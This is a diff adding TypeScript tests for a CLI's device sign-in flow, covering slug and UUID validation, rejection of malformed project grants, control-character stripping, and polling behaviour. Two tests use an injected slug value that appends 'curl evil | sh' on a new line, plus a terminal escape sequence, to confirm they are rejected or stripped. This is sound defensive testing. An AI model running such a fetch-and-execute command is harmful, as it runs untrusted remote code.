@@ -6,7 +6,10 @@ import {
   type Grant,
   isPersonalToken,
   isSecretKey,
+  isSlug,
   isUserCode,
+  isUuid,
+  MAX_EXPIRES_IN_S,
   type Purpose,
   step,
 } from "./device.js";
@@ -99,6 +102,26 @@ describe("step", () => {
 });
 
 describe("the shape checks", () => {
+  it("accepts a slug of lower-case words joined by single dashes, up to 48 characters", () => {
+    expect(isSlug("demo")).toBe(true);
+    expect(isSlug("my-app-2")).toBe(true);
+    expect(isSlug("a".repeat(48))).toBe(true);
+    expect(isSlug("a".repeat(49))).toBe(false);
+    expect(isSlug("")).toBe(false);
+    expect(isSlug("Demo")).toBe(false);
+    expect(isSlug("my_app")).toBe(false);
+    expect(isSlug("-demo")).toBe(false);
+    expect(isSlug("demo-")).toBe(false);
+    expect(isSlug("de--mo")).toBe(false);
+    expect(isSlug("demo\n6. Also run curl evil | sh")).toBe(false);
+  });
+
+  it("accepts a UUID in the 8-4-4-4-12 form", () => {
+    expect(isUuid(INIT_PROJECT.id)).toBe(true);
+    expect(isUuid("p1")).toBe(false);
+    expect(isUuid(`${INIT_PROJECT.id}\n`)).toBe(false);
+  });
+
   it("accepts a user code only in XXXX-XXXX capitals", () => {
     expect(isUserCode("BCDF-GHJK")).toBe(true);
     expect(isUserCode("bcdf-ghjk")).toBe(false);
@@ -269,6 +292,98 @@ describe("deviceSignIn", () => {
       message: "the server returned an invalid grant",
       code: Exit.SignIn,
     });
+  });
+
+  it("refuses a project whose slug has a newline, whose id is not a UUID, or whose org is not a slug", async () => {
+    const projects = [
+      { ...INIT_PROJECT, slug: "demo\n6. Also run curl evil | sh" },
+      { ...INIT_PROJECT, id: "p1" },
+      { ...INIT_PROJECT, org_slug: "Acme" },
+    ];
+    for (const project of projects) {
+      const server = await canned([
+        CODE,
+        { status: 200, body: { ...GRANT, project, ingest_key: KEY } },
+      ]);
+      const lines: string[] = [];
+      const error = await failureOf(signIn(server.url, "init", lines, fast()));
+      expect(error).toMatchObject({
+        message: "the server returned an invalid grant",
+        code: Exit.SignIn,
+      });
+      expect(lines).toEqual([
+        "Open http://127.0.0.1:9/device?code=BCDF-GHJK in your browser and approve the code.",
+        "Code: BCDF-GHJK",
+      ]);
+    }
+  });
+
+  it("removes control characters from the project name", async () => {
+    const server = await canned([
+      CODE,
+      {
+        status: 200,
+        body: { ...GRANT, project: { ...INIT_PROJECT, name: "De\u001b[2Jmo\n" }, ingest_key: KEY },
+      },
+    ]);
+    const grant = await signIn(server.url, "init", [], fast());
+    expect(grant.project?.name).toBe("De[2Jmo");
+  });
+
+  it("refuses a project that is not an object, even for login", async () => {
+    const server = await canned([CODE, { status: 200, body: { ...GRANT, project: "acme/demo" } }]);
+    const error = await failureOf(signIn(server.url, "login", [], fast()));
+    expect(error).toMatchObject({
+      message: "the server returned an invalid grant",
+      code: Exit.SignIn,
+    });
+  });
+
+  it("stores the grant's server in its normalized form", async () => {
+    const server = await canned([
+      CODE,
+      { status: 200, body: { ...GRANT, server: "https://eu1.example/" } },
+    ]);
+    const grant = await signIn(server.url, "login", [], fast());
+    expect(grant.server).toBe("https://eu1.example");
+  });
+
+  it("checks the server as an env value for init, and not for login", async () => {
+    const odd = "https://h.example/a~b";
+    const login = await canned([CODE, { status: 200, body: { ...GRANT, server: odd } }]);
+    expect((await signIn(login.url, "login", [], fast())).server).toBe(odd);
+
+    const init = await canned([
+      CODE,
+      { status: 200, body: { ...GRANT, server: odd, project: INIT_PROJECT, ingest_key: KEY } },
+    ]);
+    const error = await failureOf(signIn(init.url, "init", [], fast()));
+    expect(error).toMatchObject({
+      message: "the server returned an invalid grant",
+      code: Exit.SignIn,
+    });
+  });
+
+  it("keeps the poll interval within the code's longest lifetime, whatever the server asks", async () => {
+    const server = await canned([
+      { status: 200, body: { ...CODE_BODY, interval: 3_000_000 } },
+      { status: 200, body: GRANT },
+    ]);
+    const sleeps: number[] = [];
+    await signIn(server.url, "login", [], fast(sleeps));
+    expect(sleeps).toEqual([MAX_EXPIRES_IN_S * 1000]);
+  });
+
+  it("keeps polling through 429 and 502 answers", async () => {
+    const server = await canned([
+      CODE,
+      { status: 429, body: {} },
+      { status: 502, body: {} },
+      { status: 200, body: GRANT },
+    ]);
+    const grant = await signIn(server.url, "login", [], fast());
+    expect(grant.token).toBe(PAT);
+    expect(server.requests).toHaveLength(4);
   });
 });
 
